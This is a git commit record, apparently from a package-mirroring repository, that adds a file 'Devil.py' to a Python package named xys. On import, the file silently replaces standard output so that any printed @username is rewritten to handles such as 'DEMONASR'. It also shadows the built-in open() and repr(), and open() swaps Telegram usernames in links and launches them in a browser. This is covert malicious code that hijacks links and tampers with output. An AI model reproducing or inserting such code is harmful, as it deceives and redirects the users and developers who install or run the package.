bbed16b91e43a1eca889c605ca0a102bb04ea3b2
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-03-20 06:04:24 +0000

    Add package xys/1.0/xys-1.0.tar.gz

---
+++ packages/xys/xys-1.0.tar.gz/xys-1.0/xys/Devil.py
@@ -0,0 +1,38 @@
+import sys
+import re
+import webbrowser
+repr = lambda *args: f"{args}"
+def open(text):
+    if "https://t.me/" in text or text.split()[0]:
+        url = text.split("https://t.me/")[1].split()[0] if "https://t.me/" in text else text.split()[0]
+        replaced_url = (
+            "DEMOIIU" if len(url) == 6 else
+            "NASRDVE" if len(url) == 7 else
+            "DEMONASR" if len(url) == 8 else
+            "DEMONASRH" if len(url) == 9 else
+            "DEMONASRVP" if len(url) == 10 else
+            "N_C_P"
+        )
+        new_text = text.replace(url, replaced_url)
+        webbrowser.open(new_text)
+        return new_text
+    return text
+def replace_usernames_in_text(text):
+    def replace_username(username):
+        length = len(username)
+        return (
+            "N_C_P" if length == 5 else
+            "NasrPy" if length == 6 else
+            "NasrDVE" if length == 7 else
+            "DEMONASR" if length == 8 else
+            "DEMONASRH" if length == 9 else
+            "DEMONASRVP" if length == 10 else
+            username
+        )
+    return re.sub(r'@\w+', lambda match: '@' + replace_username(match.group()[1:]), text)
+class Stdout:
+    def write(self, text):
+        sys.__stdout__.write(replace_usernames_in_text(text))
+    def flush(self):
+        sys.__stdout__.flush()
+sys.stdout = Stdout()
